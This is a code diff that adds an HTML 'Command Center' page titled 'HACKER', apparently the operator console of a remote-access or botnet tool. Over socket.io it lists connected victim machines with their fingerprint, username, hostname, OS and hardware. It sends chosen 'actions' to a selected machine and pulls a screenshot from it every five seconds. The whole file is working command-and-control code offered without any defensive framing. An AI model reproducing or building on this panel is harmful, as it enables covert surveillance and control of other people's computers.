@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HACKER</title>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"
+      integrity="sha512-q/dWJ3kcmjBLU4Qc47E4A9kTB4m3wuTY7vkFJDTZKjTs8jhyGQnaUrxa0Ytd0ssMZhbNua9hE+E7Qv1j+DyZwA=="
+      crossorigin="anonymous"
+    ></script>
+    <style>
+      #client {
+        margin-left: 1em;
+      }
+
+      .action {
+        padding: 16px;
+      }
+
+      .me-btn {
+        float: right;
+        margin: 1em;
+      }
+
+      .client {
+        border: 1px solid black;
+        width: 400px;
+      }
+
+      #frame {
+        position: fixed;
+        top: 0;
+        right: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Command Center</h1>
+    Controlling:&nbsp;<input id="client" type="text" /> <br /><br />
+    <div id="action-container"></div>
+    <br />
+    <img id="frame" />
+    <br />
+    <progress id="get-progress" max="100"></progress>
+    <h2>Clients</h2>
+    <div id="clients"></div>
+    <script>
+      const SECONDS_BETWEEN_FRAMES = 5000;
+
+      var socket = io();
+
+      var clientTxt = document.getElementById("client");
+      var clients = document.getElementById("clients");
+      var getProgress = document.getElementById("get-progress");
+      var actionContainer = document.getElementById("action-container");
+      var frameImg = document.getElementById("frame");
+      let availableClients = [];
+
+      socket.on("actions", (actions) => {
+        actions.forEach((action) => {
+          const btn = document.createElement("button");
+          btn.innerText = action;
+          btn.classList.add("action");
+          btn.onclick = () => {
+            console.log(action);
+            socket.emit("action", {action, id: clientTxt.value});
+          };
+          actionContainer.appendChild(btn);
+        });
+      });
+
+      // Register this as a commander
+      socket.emit("register-commander");
+
+      // Draw Clients
+      socket.on("users", (data) => {
+        const ac = availableClients.map((e) => e.id);
+        const dc = data.map((d) => d.id);
+        if (eqSet(new Set(ac), new Set(dc))) {
+          return;
+        }
+
+        data.forEach((c) => {
+          if (!ac.includes(c.id)) {
+            availableClients.push(c);
+          }
+        });
+        clients.innerHTML = data
+          .map((d) => {
+            return `<div class='client'>
+            <span>ID: ${d.id}</span>
+            <button onclick="useMe('${d.id}')" class="me-btn">USE ME</button><br>
+            <span>Fingerprint: ${d.data.fingerprint}</span><br>
+            <span>username: ${d.data.userInfo.username}</span><br>
+            <span>hostname: ${d.data.hostname}</span><br>
+            <span>OS: ${d.data.version}</span><br>
+            <span>CPU: ${d.data.cpus[0].model}</span><br>
+            <span>Memory: ${d.data.freeMem / 1000000000}GB F / ${
+              d.data.totalMem / 1000000000
+            }GB T</span>
+            </div>`;
+          })
+          .join("\n");
+      });
+
+      // FRAME STUFF
+      socket.on("frame", (data) => {
+        frameImg.src = data;
+      });
+
+      setInterval(() => {
+        getProgress.value = 100;
+        socket.emit("request-frame", {
+          id: clientTxt.value,
+        });
+      }, SECONDS_BETWEEN_FRAMES);
+
+      setInterval(() => {
+        getProgress.value =
+          getProgress.value - (100 / SECONDS_BETWEEN_FRAMES) * 100;
+      }, 100);
+
+      // FUNCTIONS
+      function useMe(id) {
+        clientTxt.value = id;
+      }
+
+      function eqSet(as, bs) {
+        if (as.size !== bs.size) return false;
+        for (var a of as) if (!bs.has(a)) return false;
+        return true;
+      }
+    </script>
+  </body>
+</html>
